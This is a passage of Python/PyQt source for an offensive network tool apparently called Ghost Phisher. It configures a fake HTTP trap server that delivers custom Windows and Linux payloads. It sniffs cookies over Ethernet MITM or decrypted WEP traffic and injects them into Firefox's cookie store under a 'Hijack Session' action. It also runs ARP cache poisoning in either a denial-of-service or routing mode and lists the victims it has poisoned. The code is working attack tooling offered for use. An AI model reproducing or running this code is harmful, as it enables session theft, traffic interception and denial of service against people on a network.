            if bool(self.linux_exec_checkbox.isChecked()) and bool(self.linux_exec_edit.text()):
                ghost_trap_http.control_settings['linux_payload'] = str(self.linux_exec_edit.text())
                ghost_settings.create_settings('self.linux_exec_edit',str(self.linux_exec_edit.text()))
                progress += 1
            else:
                self.display_payload_initlializaton(False)
                self.display_error_message('Custom linux payload is not setted, please check settings')

            if progress == 2:
                self.display_payload_initlializaton(True)
                self.display_information('green',"Setting Payloads...")
                self.Stage_3_process()
            else:
                self.display_error_message("Stopped")



    def Stage_3_process(self):
        self.display_cache_initialization(True)

        ghost_trap_http.set_payload_sizes()         # Sets payload sizes for HTML

        # EVALUATE HTTP SETTINGS HERE

        self.display_information('green',"Creating Cache objects...")   # Display next phase

        # HTML SETTINGS FOR USER INTERFACE GOES HERE

        if self.cookies_checkbox.isChecked():
            ghost_trap_http.control_settings['cookies'] = 1
        else:
            ghost_trap_http.control_settings['cookies'] = 0

        if self.force_download_checkbox.isChecked():
            ghost_trap_http.control_settings['force download'] = 1
        else:
            ghost_trap_http.control_settings['force download'] = 0

        if self.respond_to_all_radio.isChecked():
            ghost_trap_http.control_settings['answer all'] = 1
        else:
            ghost_trap_http.control_settings['answer all'] = 0

        if self.respond_windows_radio.isChecked():
            ghost_trap_http.control_settings['answer windows'] = 1
        else:
            ghost_trap_http.control_settings['answer windows'] = 0

        if self.respond_linux_radio.isChecked():
            ghost_trap_http.control_settings['answer linux'] = 1
        else:
            ghost_trap_http.control_settings['answer linux'] = 0

        ghost_trap_http.control_settings['port'] = str(self.ghost_trap_http_edit.text())
        ghost_trap_http.control_settings['ip_address'] = str(self.spawn_ip_combo.currentText())

        if os.environ["ghost_fake_http_control"] == "start":                            # Check if the Fake HTTP Server is running
            if str(self.ghost_trap_http_edit.text()) == str(self.use_port_http.text()):   # Check if the Fake HTTP Server and TRAP are running on same port
                QtWidgets.QMessageBox.warning(self,"Duplicate port settings","Ghost Fake HTTP Server is currently running on\
                the selected port, Please change either of the port settings")
                self.display_error_message("Stopped")
            else:
                self.Stage_4_process()
        else:
            self.Stage_4_process()



    def Stage_4_process(self):
        ghost_trap_http.start()
        self.ghost_spawn_start.setEnabled(False)
        self.ghost_spawn_stop.setEnabled(True)
        self.display_information("green","Starting HTTP Server...")
        self.display_information("green"," ")               # Leave a gap
        self.display_information("green","Started at %s"%(time.ctime()))
        self.display_information("green"," ")               # Leave a gap

        self.display_http_initlialization(True)


    #######################################################
    #               SESSION HIJACKING                     #
    #######################################################



    def connect_objects(self):
        self.creating_cache_sig.connect(self.creating_cache)
        self.cookie_core.new_cookie_captured.connect(self.display_cookie_captured)    # Notification Signal for GUI instance"))
        self.cookie_core.cookie_buffer_detected.connect(self.emit_led_buffer)         # Notification on new http packet
        self.emit_buffer_red_light_sig.connect(self.emit_buffer_red_light)

        self.off_sniff_red_light_sig.connect(self.off_sniff_red_light)         # Will bink the sniff led red for some seconds control from blink_light()
        self.on_sniff_green_light_sig.connect(self.on_sniff_green_light)      # Will bink the sniff led green for some seconds control from blink_light()
        self.continue_sniffing_sig.connect(self.start_Cookie_Attack_part)



    def reset(self):
        selected_card = str(self.combo_interface_2.currentText())
        if(selected_card == "Select Interface Card"):
            self.start_sniffing_button_3.setEnabled(False)
            self.stop_sniffing_button_3.setEnabled(False)
            self.ethernet_mode_radio_2.setChecked(True)
            self.label_46.setText("Gateway IP Address / Router IP Address:")
            self.enable_control(False)
            return

        if(self.interface_selection_control_session):
            self.start_sniffing_button_3.setEnabled(True)
            self.stop_sniffing_button_3.setEnabled(False)
        else:
            self.start_sniffing_button_3.setEnabled(False)
            self.stop_sniffing_button_3.setEnabled(True)

        self.enable_control(True)
        if(selected_card in self.interface_card_info):
            if(self.interface_card_info[selected_card] != "WIFI"):
                self.ethernet_mode_radio_2.setChecked(True)
                self.label_46.setText("Gateway IP Address / Router IP Address:")


    def enable_control(self,status):
        self.passive_mode_radio_2.setEnabled(status)
        self.ethernet_mode_radio_2.setEnabled(status)


    def set_attack_option(self,reset = False):
        selected_card = str(self.combo_interface_2.currentText())
        if(selected_card == "Select Interface Card"):
            QtWidgets.QMessageBox.warning(self,"Interface Option","Please select a valid interface card from the list of available interfaces")
            self.ethernet_mode_radio_2.setChecked(True)
            return

        if(self.ethernet_mode_radio_2.isChecked()):
            self.monitor_interface_label_2.setText("Ethernet Mode")
            self.label_46.setText("Gateway IP Address / Router IP Address:")
        else:
            if(self.interface_card_info[selected_card] == "ETHERNET"):
                QtWidgets.QMessageBox.warning(self,"Interface Option","The selected mode only works with WIFI enabled interface cards")
                self.ethernet_mode_radio_2.setChecked(True)
                return
            if(self.interface_card_info[selected_card] == "WIFI"):
                if(self.passive_mode_radio_2.isChecked()):
                    self.monitor_interface_label_2.setText("Monitor Mode")
                    self.label_46.setText("WEP Decryption Key:")
                else:
                    self.monitor_interface_label_2.setText("Ethernet Mode")
                    self.label_46.setText("Gateway IP Address / Router IP Address:")


    def display_error(self,message):
        self.cookies_captured_label_2.setText(
            "<font color=red><b>" + message + "</b></font>")


    def firefox_is_installed(self):
        if(subprocess.getstatusoutput("which firefox")[0]):
            return(False)
        return(True)


    def refresh_interface(self):
        interface_cards = []
        self.interface_card_info = {}
        self.combo_interface_2.clear()
        self.host_interface = str()
        self.stop_sniffing_button_3.setEnabled(False)
        self.start_sniffing_button_3.setEnabled(False)
        interfaces = subprocess.getoutput("iwconfig").splitlines()

        for card in os.listdir("/sys/class/net"):
            if(card.startswith("mon")):
                subprocess.getoutput("airmon-ng stop " + card)

        sys_interface_cards = os.listdir("/sys/class/net")

        for card in sys_interface_cards:
            if(card.startswith("mon")):
                continue
            if(card == "lo"):               # Loopback interface
                continue

            for card_info in interfaces:
                if((card in card_info) and ("802.11" in card_info)):
                    interface_cards.append(card)
                    self.interface_card_info[card] = "WIFI"

            if(card not in interface_cards):
                interface_cards.append(card)
                self.interface_card_info[card] = "ETHERNET"

        if(len(interface_cards) >= 1):
            interface_cards.insert(0,"Select Interface Card")
            interface_cards.sort()
        else:
            self.display_error("No Usable interface detected")
        self.combo_interface_2.addItems(interface_cards)

    ###
    def on_sniff_green_light(self):
        self.sniffing_status_led_2.setPixmap(self.green_light)


    def off_sniff_red_light(self):
        self.sniffing_status_led_2.setPixmap(self.red_light)

    ##

    def set_monitor_mode(self):
        selected_interface = str(self.combo_interface_2.currentText())
        self.cookies_captured_label_2.clear()
        if((selected_interface == "Select Interface Card") or (selected_interface == str())):
            self.clear_items()
            return
        else:
            monitor_status = subprocess.getoutput("iwconfig " + selected_interface)
            if("Monitor" in monitor_status):
                self.monitor_interface = selected_interface
                self.monitor_interface_led_2.setPixmap(self.green_light)
                self.host_interface = selected_interface

            elif(selected_interface == self.host_interface):
                self.monitor_interface_led_2.setPixmap(self.green_light)
                return

            else:
                display = '''%s is currently not on monitor mode, should a monitor interface be created using the selected interface'''%(selected_interface)
                answer = QtWidgets.QMessageBox.question(
                    self,
                    "Enable Monitor Mode",
                    display,
                    QtWidgets.QMessageBox.StandardButton.Yes | QtWidgets.QMessageBox.StandardButton.No,
                    QtWidgets.QMessageBox.StandardButton.No,
                )
                if answer == QtWidgets.QMessageBox.StandardButton.Yes:
                    monitor_output = subprocess.getstatusoutput("airmon-ng start " + selected_interface)

                    if(monitor_output[0] == 0):
                        monitor_interface = re.findall(r"mon\d+",monitor_output[1])

                        if(monitor_interface):
                            self.monitor_interface = monitor_interface[0]
                            self.monitor_interface_led_2.setPixmap(self.green_light)
                            self.host_interface = selected_interface

                        elif("monitor mode enabled" in monitor_output[1]):
                            self.monitor_interface = selected_interface
                            self.monitor_interface_led_2.setPixmap(self.green_light)
                            self.host_interface = selected_interface
                        else:
                            self.display_error(monitor_output[1])
                    else:
                        self.display_error(monitor_output[1])
                else:
                    self.clear_items()


    def Right_click_Menu(self):

        self.treeWidget.setContextMenuPolicy(QtCore.Qt.ContextMenuPolicy.CustomContextMenu)
        self.treeWidget.customContextMenuRequested.connect(self._Right_Click_Options)


    def Save_Cookies(self):
        selected_path, _ = QtWidgets.QFileDialog.getSaveFileName(
            self,
            "Save Cookies",
            "cookies.txt",
            "Text Files (*.txt);;All Files (*)"
        )
        if(selected_path):
            cookie_open_file = open(selected_path,"w")

            database_path = os.getcwd() + "/Ghost-Phisher-Database/database.db"
            self.cookie_db_jar = sqlite3.connect(database_path)
            self.cookie_db_cursor = self.cookie_db_jar.cursor()

            self.cookie_db_cursor.execute("select distinct source from cookie_cache")
            source_addresses = self.cookie_db_cursor.fetchall()

            for source in source_addresses:              # e.g [0,("192.168.0.1",)]
                ip_address = str(source[0])

                cookie_open_file.write("\n\n")
                cookie_open_file.write(ip_address + "\n")
                cookie_open_file.write("-" * 20)
                cookie_open_file.write("\n")

                self.cookie_db_cursor.execute("select distinct Web_Address from cookie_cache where source = '" + ip_address + "'")
                web_addresses = self.cookie_db_cursor.fetchall()

                for web_address in web_addresses:
                    web_addr = str(web_address[0])

                    cookie_open_file.write("\n\n" + web_addr.strip() + "\n")
                    cookie_open_file.write("-" * (len(web_addr) + 5))
                    cookie_open_file.write("\n")

                    self.cookie_db_cursor.execute("select distinct Name,Value from cookie_cache where source = '%s' and Web_Address = '%s'"%(ip_address,web_addr))
                    cookies_values = self.cookie_db_cursor.fetchall()

                    for cookies in cookies_values:
                        cookie = cookies[0]
                        value = cookies[1]

                        cookie_open_file.write("\n%s:     %s" % (str(cookie),str(value)))

            cookie_open_file.close()
            QtWidgets.QMessageBox.information(self,"Save Cookies","Successfully saved all captured cookies to:  " + selected_path)



    def Clear_All(self):
        answer = QtWidgets.QMessageBox.question(
            self,
            "Clear Captured Cookies",
            "Are you sure you want to clear all captured cookies?",
            QtWidgets.QMessageBox.StandardButton.Yes | QtWidgets.QMessageBox.StandardButton.No,
            QtWidgets.QMessageBox.StandardButton.No,
        )
        if answer == QtWidgets.QMessageBox.StandardButton.Yes:
            self.cookie_db_cursor.execute("delete from cookie_cache")
            self.cookie_db_jar.commit()
            self.cookie_core.captured_cookie_count = 0
            self.cookies_captured_label_2.setText("<font color=green><b>" + str(self.cookie_core.captured_cookie_count) + " Cookies Captured</b></font>")
            self.treeWidget.clear()


    def Delete_Cookie(self):
        self.treeWidget.currentItem().removeChild(self.treeWidget.currentItem())


    def open_web_address(self,address):
        QDesktopServices.openUrl(QUrl(address))


    def Hijack_Session(self):
        self.mozilla_cookie_engine.kill_Process("firefox")
        selected_cookie = str(self.treeWidget.currentItem().text(0))
        sql_code_a = "select Referer from cookie_cache where Web_Address = '%s'"
        sql_code_b = "select Host,Name,Value,Dot_Host,Path,IsSecured,IsHttpOnly from cookie_cache where Web_Address = '%s'"

        self.cookie_db_cursor.execute("select Host from cookie_cache where Web_Address = '%s'" % (selected_cookie))
        result = self.cookie_db_cursor.fetchone()
        if(result):
            self.mozilla_cookie_engine.execute_query("delete from moz_cookies where baseDomain = '%s'" % (result[0]))

        self.cookie_db_cursor.execute(sql_code_a % (selected_cookie))
        web_address = self.cookie_db_cursor.fetchone()[0]

        self.cookie_db_cursor.execute(sql_code_b % (selected_cookie))
        return_items = self.cookie_db_cursor.fetchall()

        for entries in return_items:
            self.mozilla_cookie_engine.insert_Cookie_Values(
            str(entries[0]),str(entries[1]),str(entries[2]),
            str(entries[3]),str(entries[4]),str(entries[5]),
            str(entries[6]))

        _thread.start_new_thread(self.open_web_address,(web_address,))


    def _Right_Click_Options(self,pos):
        menu = QtWidgets.QMenu(self)
        try:
            item_type = str(self.treeWidget.currentItem().text(0))
        except AttributeError:
            return

        hijack_cookie = menu.addAction("Hijack Session")

        if((item_type.count(".") == 3  and item_type[0:3].isdigit()) or item_type.count(":") >= 1):
            hijack_cookie.setEnabled(False)
        else:
            if not self.firefox_is_installed():
                hijack_cookie.setEnabled(False)
            else:
                hijack_cookie.setEnabled(True)

        save_cookie = menu.addAction("Save Cookies")
        clear_all = menu.addAction("Clear All")
        delete_cookie = menu.addAction("Delete")

        selected_action = menu.exec_(self.treeWidget.mapToGlobal(pos))
        if(selected_action == hijack_cookie):
            self.Hijack_Session()
        if(selected_action == save_cookie):
            self.Save_Cookies()
        if(selected_action == clear_all):
            self.Clear_All()
        if(selected_action == delete_cookie):
            self.Delete_Cookie()



    # Blinks the cookie buffer light on http packet detection
    def emit_led_buffer(self):
        self.cookie_detection_led_2.setPixmap(self.green_light)
        _thread.start_new_thread(self.delay_thread,())

    def emit_buffer_red_light(self):
        self.cookie_detection_led_2.setPixmap(self.red_light)

    def delay_thread(self):
        time.sleep(0.2)
        self.emit_buffer_red_light_sig.emit()



    # Displays cookies on GUI treeWidget
    def display_cookie_captured(self):
        self.treeWidget.clear()

        database_path = os.getcwd() + "/Ghost-Phisher-Database/database.db"
        self.cookie_db_jar = sqlite3.connect(database_path)
        self.cookie_db_cursor = self.cookie_db_jar.cursor()

        self.cookie_db_cursor.execute("select distinct source from cookie_cache")
        source_addresses = self.cookie_db_cursor.fetchall()

        for count_a,source in enumerate(source_addresses):              # e.g [0,("192.168.0.1",)]
            ip_address = str(source[0])

            item_0 = QtWidgets.QTreeWidgetItem(self.treeWidget)

            self.treeWidget.topLevelItem(count_a).setText(0,ip_address)
            self.cookie_db_cursor.execute("select distinct Web_Address from cookie_cache where source = '" + ip_address + "'")
            web_addresses = self.cookie_db_cursor.fetchall()

            for count_b,web_address in enumerate(web_addresses):

                web_addr = str(web_address[0])

                item_1 = QtWidgets.QTreeWidgetItem(item_0)
                icon = QtGui.QIcon()
                icon.addPixmap(self.green_light)
                item_1.setIcon(0, icon)

                self.treeWidget.topLevelItem(count_a).child(count_b).setText(0,web_addr)
                self.cookie_db_cursor.execute("select distinct Name,Value from cookie_cache where source = '%s' and Web_Address = '%s'"%(ip_address,web_addr))
                cookies_values = self.cookie_db_cursor.fetchall()

                for count_c,cookies in enumerate(cookies_values):
                    cookie = cookies[0]
                    value = cookies[1]

                    item_2 = QtWidgets.QTreeWidgetItem(item_1)
                    self.treeWidget.topLevelItem(count_a).child(count_b).child(count_c).setText(0,"%s:  %s" % (str(cookie),str(value)))

        self.treeWidget.collapseAll()
        self.cookies_captured_label_2.setText("<font color=green><b>" + str(self.cookie_core.captured_cookie_count) + " Cookies Captured</b></font>")

    def prepare_Mozilla_Database(self):
        sql_code_a = "select value from cache_settings where setting = 'cookie_path'"
        sql_code_c = "insert into cache_settings values ('%s','%s')"
        if(self.firefox_is_installed()):
            if not self.mozilla_cookie_engine.cookie_database:

                database_path = os.getcwd() + "/Ghost-Phisher-Database/database.db"
                cookie_db_jar = sqlite3.connect(database_path)
                cookie_db_cursor = cookie_db_jar.cursor()
                cookie_db_cursor.execute(sql_code_a)
                result = cookie_db_cursor.fetchone()
                if(result):
                    self.mozilla_cookie_engine.cookie_database = result[0]
                    if not os.path.exists(self.mozilla_cookie_engine.cookie_database):
                        self.creating_cache_sig.emit()
                        path = self.mozilla_cookie_engine.get_Cookie_Path("cookies.sqlite")
                        if not path:
                            raise Exception("cookies.sqlite3 firefox database has not been created on this system, Please run firefox to create")
                        cookie_db_cursor.execute("delete from cache_settings where setting = 'cookie_path'")
                        cookie_db_cursor.execute(sql_code_c % ("cookie_path",path))
                        cookie_db_jar.commit()
                else:
                    self.creating_cache_sig.emit()
                    path = self.mozilla_cookie_engine.get_Cookie_Path("cookies.sqlite")
                    if not path:
                        raise Exception("cookies.sqlite3 firefox database has not been created on this system, Please run firefox to create")
                    cookie_db_cursor.execute(sql_code_c % ("cookie_path",path))
                    cookie_db_jar.commit()

                cookie_db_jar.close()

            self.mozilla_cookie_engine.execute_query("delete from moz_cookies")
            self.start_Attack()



    def creating_cache(self):
        self.start_sniffing_button_3.setEnabled(False)
        self.stop_sniffing_button_3.setEnabled(False)
        self.cookies_captured_label_2.setText("<font color=green>Please wait caching objects...</font>")


    # Attack starts here on button click()
    def start_Cookie_Attack(self):
        if(self.stop_arp_poison.isEnabled()):
            QtWidgets.QMessageBox.warning(self,"Routing Conflict","Please you cannot run the ARP Cache Poisoning and Session Hijacking attacks at the same time")
            return

        self.cookie_core = Cookie_Hijack_Core()                 # Cookie Capture and processing core
        selected_interface = str(self.combo_interface_2.currentText())
        self.cookies_captured_label_2.clear()
        ip_wep_edit = str(self.wep_key_edit_2.text())

        if(self.passive_mode_radio_2.isChecked()):
            self.set_monitor_mode()
            self.cookie_core.decryption_key = ip_wep_edit                # Pipes key (WEP) into cookie process API for processing encrypted frames
            self.mitm_activated_label.setEnabled(False)
            self.mitm_activated_label.setText("Internal MITM Engine Activated")

        if(self.ethernet_mode_radio_2.isChecked()):
            if(not re.match(r"(\d+.){3}\d+",ip_wep_edit)):
                QtWidgets.QMessageBox.warning(self,"Invalid IP Address","Please insert a valid IPv4 Address of the Default Gateway")
                self.wep_key_edit_2.setFocus()
                return

            self.monitor_interface_led_2.setPixmap(self.green_light)

            os.environ["interface_card"] = selected_interface
            os.environ["gateway_ip_address"] = ip_wep_edit             # Gateway Address

            path = os.getcwd() + "/core/MITM_Core.py"
            open_file = open(os.devnull,"w")
            mitm_control = subprocess.Popen("python " + path,shell = True,stdout = open_file,stderr = open_file)
            self.mitm_pid = mitm_control.pid

            self.mitm_activated_label.setEnabled(True)
            self.mitm_activated_label.setText("<font color = green><b>Internal MITM Engine Activated</b></font>")

            self.monitor_interface = selected_interface

        try:
            database_path = os.getcwd() + "/Ghost-Phisher-Database/database.db"
            self.cookie_core.cookie_db_jar = sqlite3.connect(database_path)
            self.cookie_core.cookie_db_cursor = self.cookie_core.cookie_db_jar.cursor()
            self.cookie_core.create_cookie_cache()                      # Create Cookie Cache
            self.cookie_core.truncate_database()                        # Delete all old items from database

        except Exception as message:
            self.display_error("Failed to create cookie database: " + str(message))
            return

        self.interface_selection_control_session = False
        ghost_settings.create_settings("self.wep_key_edit_2",ip_wep_edit)
        _thread.start_new_thread(self.prepare_Mozilla_Database,())       # Trucates and prepares database




    def start_Attack(self):
        self.cookies_captured_label_2.clear()
        if not self.firefox_is_installed():
            QtWidgets.QMessageBox.warning(self,"Mozilla Firefox Detection",
            "Mozilla firefox is currently not installed on this computer, you need Firefox to browse hijacked sessions, Process will capture cookies for manual analysis")

        self.treeWidget.clear()
        self.wep_key_edit_2.setEnabled(False)                             # Lock WEP/WPA LineEdit

        self.cookie_core.control = True                                 # Start Core Thread processes
        self.cookie_core.monitor_interface = self.monitor_interface     # Holds the monitor interface e.g mon0,mon1

        _thread.start_new_thread(self.Led_Blink,())                      # Blinks Sniff Led for some number of seconds
        self.start_sniffing_button_3.setEnabled(False)



    def start_Cookie_Attack_part(self):
        try:
            self.connect_objects()
            self.cookie_core.start()
            self.sniffing_status_led_2.setPixmap(self.green_light)
            self.stop_sniffing_button_3.setEnabled(True)
            self.start_sniffing_button_3.setEnabled(False)
            self.ethernet_mode_radio_2.setEnabled(False)
            self.passive_mode_radio_2.setEnabled(False)

        except Exception as message:
            self.display_error(str(message))
            self.sniffing_status_led_2.setPixmap(self.red_light)
            self.cookie_detection_led_2.setPixmap(self.red_light)
            self.ethernet_mode_radio_2.setEnabled(True)
            self.passive_mode_radio_2.setEnabled(True)


    def Led_Blink(self):
        for count in range(3):
            self.on_sniff_green_light_sig.emit()
            time.sleep(1)
            self.off_sniff_red_light_sig.emit()
            time.sleep(1)
            self.on_sniff_green_light_sig.emit()

        self.continue_sniffing_sig.emit()
        return



    def stop_Cookie_Attack(self):
        if(self.ethernet_mode_radio_2.isChecked()):
            self.mitm_activated_label.setEnabled(False)
            self.mitm_activated_label.setText("Internal MITM Engine Activated")

            self.kill_MITM_process()

        self.cookie_core.control = False
        self.interface_selection_control_session = True

        self.wep_key_edit_2.setEnabled(True)                              # Release WEP/WPA Decryption LineEdit
        self.start_sniffing_button_3.setEnabled(True)
        self.stop_sniffing_button_3.setEnabled(False)
        self.ethernet_mode_radio_2.setEnabled(True)
        self.passive_mode_radio_2.setEnabled(True)

        self.cookie_core = Cookie_Hijack_Core()
        self.sniffing_status_led_2.setPixmap(self.red_light)
        self.cookie_detection_led_2.setPixmap(self.red_light)


    def kill_MITM_process(self):
        os.system("kill " + str(self.mitm_pid))


    def clear_items(self):
        self.treeWidget.clear()
        self.cookies_captured_label_2.clear()
        self.cookie_detection_label_2.setEnabled(True)
        self.sniffing_status_label_2.setEnabled(True)
        self.monitor_interface_label_2.setEnabled(True)
        self.cookie_detection_led_2.setPixmap(self.red_light)
        self.sniffing_status_led_2.setPixmap(self.red_light)
        self.cookies_captured_label_2.clear()
        self.monitor_interface_led_2.setPixmap(self.red_light)



    #######################################################
    #               ARP CACHE POISONING                   #
    #######################################################

    def refresh_interface_arp(self):
        path = "/sys/class/net"
        sys_interface = os.listdir(path)
        self.combo_interface_3.clear()
        if(sys_interface):
            self.combo_interface_3.addItem("Select Interface")
            for interface in sys_interface:
                if(interface == "lo"):
                    continue
                self.combo_interface_3.addItem(interface)

        if(sys_interface):
            self.start_arp_poison.setEnabled(True)
            self.stop_arp_poison.setEnabled(False)
        else:
            self.start_arp_poison.setEnabled(False)
            self.stop_arp_poison.setEnabled(False)

        self.interface_filter()



    def interface_filter(self):
        interface_card = str(self.combo_interface_3.currentText())

        if(interface_card == "Select Interface"):
            self.start_arp_poison.setEnabled(False)
            self.stop_arp_poison.setEnabled(False)
        else:
            if(self.interface_selection_control):
                self.start_arp_poison.setEnabled(True)
                self.stop_arp_poison.setEnabled(False)
            else:
                self.start_arp_poison.setEnabled(False)
                self.stop_arp_poison.setEnabled(True)




    def start_arp_poison_attack(self):
        arp_attack_option = str()
        interface_card = str(self.combo_interface_3.currentText())
        target_address = str(self.wep_key_edit_3.text())

        self.arp_poison_browser.clear()

        if(self.stop_sniffing_button_3.isEnabled()):
            QtWidgets.QMessageBox.warning(self,"Routing Conflict","Please you cannot run the Session Hijacking and ARP Cache Poisoning attacks at the same time")
            return

        if(not re.match(r"(\d+.){3}\d+",target_address)):
            QtWidgets.QMessageBox.warning(self,"Invalid IP Address","Please insert a valid IPv4 Address of the Default Gateway")
            self.wep_key_edit_3.setFocus()
            return

        ghost_settings.create_settings("self.wep_key_edit_3",target_address)

        if(self.poison_one_way_combo.isChecked()):
            arp_attack_option = "DOS"
        else:
            arp_attack_option = "ARP POISON + ROUTE"

        self.arp_attack.interface_card = interface_card
        self.arp_attack.gateway_IP_address = target_address
        self.arp_attack.set_Attack_Option(arp_attack_option)

        self.arp_attack.control = True
        self.arp_attack.start()
        self.arp_poison_browser.append("<font color=green>Started ARP Cache Poisoning at " + str(time.ctime()) + "</font>")

        self.arp_poison_browser.append(str())

        if(arp_attack_option == "DOS"):
            self.arp_poison_browser.append("<font color=green><b>DOS Activated</b></font>")
        else:
            self.arp_poison_browser.append("<font color=green><b>Routing Mode Activated</b></font>")

        self.start_arp_poison.setEnabled(False)
        self.stop_arp_poison.setEnabled(True)

        self.arp_poison_browser.append(str())

        self.arp_poison_browser.append("<font color=green><b>Poisoned ARP Cache Victims</b></font>")
        self.arp_poison_browser.append("<font color=green><b>%s</b></font>"%("-" * 50))

        self.interface_selection_control = False
        _thread.start_new_thread(self.Check_New_Arp_Victim,())



    def Check_New_Arp_Victim(self):
        arp_number = int()
        while(self.arp_attack.control == True):
            arp_victim_count = len(list(self.arp_attack.subnet_hosts.keys()))
            if(arp_victim_count > arp_number):
                self.new_arp_victim.emit()
                arp_number = arp_victim_count

            time.sleep(1)



    def display_arp_victim_info(self):
        all_hosts = set(self.arp_attack.subnet_hosts.keys())
        for victim in list(self.arp_victims.symmetric_difference(all_hosts)):
            mac_address = self.arp_attack.subnet_hosts[victim]
            self.arp_poison_browser.append("<font color=green><b>%s</b>%s<b>%s</b>"%(victim,'&nbsp;' * 8,mac_address))
            self.arp_victims.add(victim)



    def stop_arp_poison_attack(self):
        self.arp_attack.control = False
        self.arp_victims = set()
        self.arp_attack._Thread__stop()
        self.arp_attack = Fern_MITM_Class.ARP_Poisoning()
        self.start_arp_poison.setEnabled(True)
        self.stop_arp_poison.setEnabled(False)
        self.interface_selection_control = True
        self.arp_poison_browser.append(str())
        self.arp_poison_browser.append("<font color=red>Stopped ARP Cache Poisoning at " + str(time.ctime()) + "</font>")




    #######################################################
    #               CLOSING GHOST PHISHER                 #
    #######################################################


    def closeEvent(self,event):
        ''' Close Network connections after
            user exits application
        '''
        global http_terminal
        answer = QtWidgets.QMessageBox.question(
            self,
            "Ghost Phisher",
            "Are you sure you want to quit?",
            QtWidgets.QMessageBox.StandardButton.Yes | QtWidgets.QMessageBox.StandardButton.No,
            QtWidgets.QMessageBox.StandardButton.No,
        )
        if answer == QtWidgets.QMessageBox.StandardButton.Yes:

            if(self.stop_sniffing_button_3.isEnabled()):
                typedef = type(self.cookie_db_jar).__name__
                if(typedef == "Connection"):
                    self.cookie_db_jar.close()                          # Close cookie database connection

                self.kill_MITM_process()
                self.cookie_core.terminate()                            # Kill QtCore.QThread

            if(os.environ.get("ghost_fake_http_control") == "start"):
                    self.stop_http()

            if self.ghost_dns.control_dns:
                self.stop_dns()

            try:
                subprocess.getstatusoutput('killall airbase-ng')
                self.stop_dhcp()

            except NameError:
                pass
            if self.metasploit_object.isRunning():
                self.metasploit_object.terminate()
            subprocess.getstatusoutput("killall xterm")
            ghost_settings.close_setting_file()
            event.accept()
        else:
            event.ignore()


